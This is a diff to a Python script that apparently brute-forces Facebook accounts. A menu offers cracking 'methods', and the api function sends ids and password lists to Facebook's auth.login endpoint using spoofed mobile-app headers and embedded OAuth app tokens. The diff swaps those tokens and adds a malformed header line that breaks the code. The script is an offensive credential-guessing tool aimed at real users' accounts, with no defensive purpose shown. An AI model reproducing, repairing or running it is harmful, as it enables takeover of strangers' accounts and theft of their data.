@@ -138,7 +138,7 @@ def menu():
                                 clear()
                                 print(' All Method are Update Check One By One  ')
                                 linex()
-                                print(' [1] Method 1 (For Fresh Id Only )\n [2] Method 2 ( Mix Old & Fresh Id)\n [3] Method 3 (Fast Speed )\n [4] Method 4 Random(Old Id Clone)\n [5] Method 5 Random (Best for Pak)\n [6] Method 6 Random(Medium Speed)\n [7] Method 7 Random (All Country Best)\n')
+                                print(' [1] Method 1 (For Fresh Id Only )\n [2] Method 2 ( Mix Old & Fresh Id)' )
                                 linex() 
                                 mthd=input(' Choose: ')
                                 linex()
@@ -171,7 +171,7 @@ def menu():
                                                 if mthd in ['1','01']:
                                                         crack_submit.submit(ffb,ids,names,passlist)
                                                 elif mthd in ['2','02']:
-                                                        crack_submit.submit(api1,ids,names,passlist)
+                                                        crack_submit.submit(api,ids,names,passlist)
                                                 elif mthd in ['3','03']:
                                                         crack_submit.submit(ffb3,ids,names,passlist) 
                                                 elif mthd in ['4','04']:
@@ -290,13 +290,14 @@ def api(ids,names,passlist):
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(20000, 40000)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
+                                        'x-fb-connection-type':'mobile.lte',
+                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-bandwidth':str(random.randint(20000000, 30000000)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
+                                        'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
                                 url = 'https://b-api.facebook.com/method/auth.login'
@@ -403,5 +404,4 @@ except requests.exceptions.ConnectionError:
         exit()
 except Exception as e:pass
 menu()
-
 
